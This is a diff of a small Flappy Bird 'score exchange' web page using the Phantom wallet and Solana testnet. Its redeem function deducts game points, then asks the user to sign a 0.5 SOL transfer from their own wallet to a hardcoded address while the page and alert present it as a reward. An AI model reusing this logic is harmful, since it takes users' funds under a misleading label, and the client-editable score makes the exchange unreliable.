@@ -1,214 +1,139 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <link
-      href="https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap"
-      rel="stylesheet"
-    />
-
-    <title>Exchange Interface</title>
-    <link rel="stylesheet" href="flappybird.css" />
+    <title>Flappy Bird Score Exchange</title>
+    <link rel="stylesheet" href="/css/cssexchange.css" />
+    <!-- Thêm polyfill cho Buffer -->
+    <script src="https://cdn.jsdelivr.net/npm/buffer@5.7.1/index.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.55.0/lib/index.iife.js"></script>
   </head>
-  <style>
-    /* Sử dụng font Press Start 2P cho toàn bộ trang */
-    body {
-      font-family: "Press Start 2P", cursive;
-      font-size: 15px;
-      background-color: #1e1e1e;
-    }
-
-    /* Các phần còn lại của CSS như trước */
-    .container {
-      width: 400px;
-      background: #2a2a2a;
-      border-radius: 10px;
-      padding: 20px;
-      text-align: center;
-      box-shadow: 0 15px 24px rgba(108, 107, 107, 0.6);
-      position: relative; /* Đảm bảo có thể sử dụng z-index */
-      z-index: 10; /* Đảm bảo phần tử sẽ xuất hiện trên nền khác */
-    }
-
-    h1 {
-      margin-bottom: 20px;
-      color: white;
-    }
-
-    .highlight {
-      color: orange;
-    }
-
-    .wallet-section {
-      margin: 20px 0;
-    }
-
-    .wallet {
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      margin: 10px 0;
-    }
-
-    .wallet img {
-      width: 80px;
-      height: 80px;
-      border-radius: 5px;
-    }
-
-    .label {
-      font-size: 14px;
-      color: #ccc;
-    }
-
-    .value {
-      font-size: 18px;
-    }
-
-    .value span {
-      font-size: 14px;
-      color: #777;
-    }
-
-    hr {
-      border: none;
-      height: 1px;
-      background: #444;
-      margin: 10px 0;
-    }
-
-    .exchange-section {
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      margin: 20px 0;
-    }
-
-    .input-group {
-      text-align: left;
-    }
-
-    .input-group label {
-      display: block;
-      font-size: 14px;
-      color: #aaa;
-      margin-bottom: 5px;
-    }
-
-    .input-group input {
-      width: 100px;
-      padding: 5px;
-      font-size: 16px;
-      border-radius: 5px;
-      border: none;
-      background: #444;
-      color: white;
-      text-align: center;
-    }
-
-    .swap-icon {
-      font-size: 24px;
-      color: orange;
-      margin: 0 10px;
-    }
-
-    .actions {
-      display: flex;
-      justify-content: space-between;
-    }
-
-    .cancel-btn {
-      background: green;
-      color: white;
-      padding: 10px 20px;
-      border: none;
-      border-radius: 5px;
-      cursor: pointer;
-    }
-
-    .confirm-btn {
-      background: orange;
-      color: white;
-      padding: 10px 20px;
-      border: none;
-      border-radius: 5px;
-      cursor: pointer;
-    }
-
-    .value {
-      display: flex;
-      align-items: center; /* Căn giữa theo chiều dọc */
-      justify-content: center; /* Căn giữa theo chiều ngang */
-      gap: 10px; /* Khoảng cách giữa số và chữ */
-    }
-
-    .number {
-      padding: 5px 10px;
-      border: 2px solid white;
-      border-radius: 5px;
-      background-color: #eae6e6;
-      color: white;
-      font-size: 18px;
-      font-weight: bold;
-      display: inline-block; /* Đảm bảo số có thể căn chỉnh cùng với label */
-      width: 170px;
-      height: 28px;
-    }
-
-    .label {
-      font-size: 16px;
-      color: #aaa;
-      display: inline-block; /* Đảm bảo label có thể căn chỉnh cùng với number */
-    }
-    .input-group input {
-      font-family: "Press Start 2P", "Courier New", Courier, monospace;
-      width: 170px;
-      height: 28px;
-    }
-  </style>
-
   <body>
-    <div class="container">
-      <h1>EXCHANGE COIN FOR <span class="highlight">SOL</span></h1>
-      <div class="wallet-section">
-        <div class="wallet">
-          <img src="/image/Flappy_Bird_icon.png" alt="Flappy Icon" />
-          <div>
-            <p class="label">TOTAL FLAPPY</p>
-            <p class="value">
-              <span class="number">100</span>
-              <span class="label">COIN</span>
-            </p>
-          </div>
-        </div>
-        <hr />
-        <div class="wallet">
-          <img src="image/solana.png" alt="Solana Icon" />
-          <div>
-            <p class="label">TOTAL SONALA</p>
-            <p class="value">
-              <span class="number">100</span>
-              <span class="label">SOL</span>
-            </p>
-          </div>
-        </div>
-      </div>
-      <div class="exchange-section">
-        <div class="input-group">
-          <label>COIN</label>
-          <input type="text" value="200" />
-        </div>
-        <div class="swap-icon">⇄</div>
-        <div class="input-group">
-          <label>SOL</label>
-          <input type="text" value="20" />
-        </div>
-      </div>
-      <div class="actions">
-        <button class="cancel-btn">CANCEL</button>
-        <button class="confirm-btn">CONFIRM</button>
+    <!-- Header Section with Connect Wallet button -->
+    <div class="header">
+      <h1>Flappy Bird Score Exchange</h1>
+      <div class="connect-wallet-container">
+        <button class="connect-wallet-btn" id="connect-wallet-btn">
+          Connect Wallet
+        </button>
+        <p id="wallet-address" style="margin-left: 15px; font-weight: bold"></p>
       </div>
     </div>
+
+    <div class="wallet-section">
+      <p class="label">Flappy Bird Score:</p>
+      <p class="value" id="flappy-score">0</p>
+    </div>
+
+    <button><a href="/index.html">Back</a></button>
+
+    <button onclick="redeemPoints()">Đổi Điểm</button>
+
+    <script>
+      window.onload = function () {
+        loadFlappyScore();
+      };
+
+      function loadFlappyScore() {
+        let totalFlappy = parseFloat(localStorage.getItem("totalFlappy")) || 0;
+        document.getElementById("flappy-score").innerText =
+          totalFlappy.toFixed(0);
+      }
+
+      async function redeemPoints() {
+        let totalFlappy = parseFloat(localStorage.getItem("totalFlappy")) || 0;
+        let pointsToRedeem = 2;
+
+        if (totalFlappy >= pointsToRedeem) {
+          totalFlappy -= pointsToRedeem;
+          localStorage.setItem("totalFlappy", totalFlappy);
+
+          if (window.solana && window.solana.isPhantom) {
+            try {
+              // Kết nối ví Phantom
+              const response = await window.solana.connect();
+              const walletAddress = response.publicKey.toString();
+
+              // Tạo kết nối tới mạng testnet của Solana
+              const connection = new solanaWeb3.Connection(
+                solanaWeb3.clusterApiUrl("testnet")
+              );
+
+              // Lấy số dư ví Solana
+              const balance = await connection.getBalance(
+                new solanaWeb3.PublicKey(walletAddress)
+              );
+              console.log(
+                "Wallet balance (SOL): " + (balance / 1e9).toFixed(2)
+              );
+
+              // Tạo giao dịch chuyển SOL
+              const transaction = new solanaWeb3.Transaction().add(
+                solanaWeb3.SystemProgram.transfer({
+                  fromPubkey: new solanaWeb3.PublicKey(walletAddress),
+                  toPubkey: new solanaWeb3.PublicKey(
+                    "D8TsKvwtTgvu4EpBidFTpksUYiuydxbD97ot51bbqRUh"
+                  ),
+                  lamports: solanaWeb3.LAMPORTS_PER_SOL * 0.5, // 0.5 SOL cho 2 điểm
+                })
+              );
+
+              // Ký và gửi giao dịch
+              const { signature } = await window.solana.signAndSendTransaction(
+                transaction
+              );
+              await connection.confirmTransaction(signature);
+
+              alert(
+                "Đổi điểm thành công! Bạn còn " +
+                  totalFlappy.toFixed(0) +
+                  " điểm."
+              );
+            } catch (error) {
+              console.error("Error interacting with Phantom Wallet:", error);
+              alert("Không thể kết nối với ví Phantom.");
+            }
+          } else {
+            alert("Phantom Wallet chưa được cài đặt!");
+          }
+
+          document.getElementById("flappy-score").innerText =
+            totalFlappy.toFixed(0);
+        } else {
+          alert("Không đủ điểm để đổi!");
+        }
+      }
+
+      document
+        .querySelector("#connect-wallet-btn")
+        .addEventListener("click", async () => {
+          if (window.solana && window.solana.isPhantom) {
+            try {
+              const response = await window.solana.connect();
+              const walletAddress = response.publicKey.toString();
+
+              // Hiển thị địa chỉ ví cắt ngắn
+              document.querySelector("#wallet-address").innerText =
+                "Wallet: " +
+                walletAddress.slice(0, 4) +
+                "..." +
+                walletAddress.slice(-4);
+
+              // Cập nhật nút kết nối
+              document.querySelector(".connect-wallet-btn").innerText =
+                "Wallet Connected";
+              document.querySelector(".connect-wallet-btn").disabled = true;
+
+              alert("Wallet connected: " + walletAddress);
+            } catch (error) {
+              console.error("Error connecting wallet:", error);
+              alert("Không thể kết nối với ví Phantom.");
+            }
+          } else {
+            alert("Phantom Wallet chưa được cài đặt!");
+          }
+        });
+    </script>
   </body>
 </html>
